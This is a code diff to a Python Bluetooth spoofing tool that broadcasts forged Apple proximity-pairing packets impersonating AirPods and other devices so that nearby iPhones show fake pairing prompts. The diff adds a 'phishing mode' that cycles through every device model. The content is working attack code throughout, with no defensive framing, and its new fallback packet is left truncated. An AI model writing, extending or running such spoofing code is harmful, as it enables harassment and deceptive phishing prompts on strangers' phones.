@@ -36,62 +36,75 @@ class AdvertisingModule:
         else:
             print(message)
 
-    def start_spoof(self, interval_ms=200, custom_payload=None, model_name="AirPods"):
-        self.log(f"[bold blue][*] Starting Spoofing ([white]{model_name}[/white]) on hci{self.dev_id}...[/bold blue]")
+    def start_spoof(self, interval_ms=200, custom_payload=None, model_name="AirPods", phishing_mode=False):
+        if phishing_mode:
+            self.log(f"[bold red][*] Starting PHISHING MODE ([white]Cycling all models[/white]) on hci{self.dev_id}...[/bold red]")
+        else:
+            self.log(f"[bold blue][*] Starting Spoofing ([white]{model_name}[/white]) on hci{self.dev_id}...[/bold blue]")
         
         self.sock = open_dev(self.dev_id)
         if not self.sock:
             return
 
-        self.log(f"[green][*] Broadcasting {model_name}. Look at your iPhone![/green]")
+        if phishing_mode:
+            self.log(f"[red][*] PHISHING MODE ACTIVE. Cycling through all models. Look at your iPhone![/red]")
+        else:
+            self.log(f"[green][*] Broadcasting {model_name}. Look at your iPhone![/green]")
         self.log("[dim][*] Press Ctrl+C to stop.[/dim]")
 
         try:
-            def run_loop():
-                while True:
-                    packet_data = ()
-                    
-                    if custom_payload:
-                        packet_data = custom_payload
-                    else:
-                        bat_left = random.randint(10, 100)
-                        bat_right = random.randint(10, 100)
-                        bat_case = random.randint(10, 100)
-                        
-                        try:
-                             packet_data = ProximityPairingPacket.build(
-                                 model_name=model_name,
-                                 battery_left=bat_left,
-                                 battery_right=bat_right,
-                                 battery_case=bat_case,
-                                 charging_left=False,
-                                 charging_right=False,
-                                 charging_case=False,
-                                 lid_open=True 
-                             )
-                             
-                        except Exception as e:
-                             prefix = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45)
-                             suffix = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)
-                             left = (random.randint(1, 100),)
-                             right = (random.randint(1, 100),)
-                             case = (random.randint(128, 228),)
-                             packet_data = prefix + left + right + case + suffix
-                    
-                    start_le_advertising(self.sock, min_interval=200, max_interval=200, data=packet_data)
-                    
-                    time.sleep(2)
-                    stop_le_advertising(self.sock)
-                    time.sleep(0.1)
-
-            if self.console:
-                with self.console.status(f"[bold green]Broadcasting {model_name}...[/bold green]", spinner="earth"):
-                     run_loop()
+            if self.console and phishing_mode:
+                 with self.console.status("[bold red]PHISHING MODE: Cycling all models...[/bold red]", spinner="earth"):
+                     self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode)
+            elif self.console and not phishing_mode:
+                 with self.console.status(f"[bold green]Broadcasting {model_name}...[/bold green]", spinner="earth"):
+                     self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode)
             else:
-                 run_loop()
+                 self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode)
 
         except KeyboardInterrupt:
             self.log("\n[yellow][*] Stopping Advertisement...[/yellow]")
             stop_le_advertising(self.sock)
         except Exception as e:
             self.log(f"[red][!] Error: {e}[/red]")
+
+    def _spoof_loop(self, interval_ms, custom_payload, model_name, phishing_mode):
+        while True:
+            if phishing_mode:
+                 keys = list(self.DEVICE_DATA.keys())
+                 for k in keys:
+                     m = self.DEVICE_DATA[k]['name']
+                     packet_data = self.build_packet(m)
+                     start_le_advertising(self.sock, min_interval=100, max_interval=100, data=packet_data)
+                     time.sleep(2)
+                     stop_le_advertising(self.sock)
+                     time.sleep(0.1)
+            else:
+                packet_data = ()
+                if custom_payload:
+                    packet_data = custom_payload
+                else:
+                    packet_data = self.build_packet(model_name)
+                    
+                start_le_advertising(self.sock, min_interval=interval_ms, max_interval=interval_ms, data=packet_data)
+                time.sleep(2)
+                stop_le_advertising(self.sock)
+                time.sleep(0.1)
+
+    def build_packet(self, name):
+        try:
+             bat_left = random.randint(10, 100)
+             bat_right = random.randint(10, 100)
+             bat_case = random.randint(10, 100)
+             return ProximityPairingPacket.build(
+                 model_name=name,
+                 battery_left=bat_left,
+                 battery_right=bat_right,
+                 battery_case=bat_case,
+                 charging_left=False,
+                 charging_right=False,
+                 charging_case=False,
+                 lid_open=True 
+             )
+        except:
+             return (0x1e, 0xff, 0x4c, 0x00, 0x07) # Fallback truncated
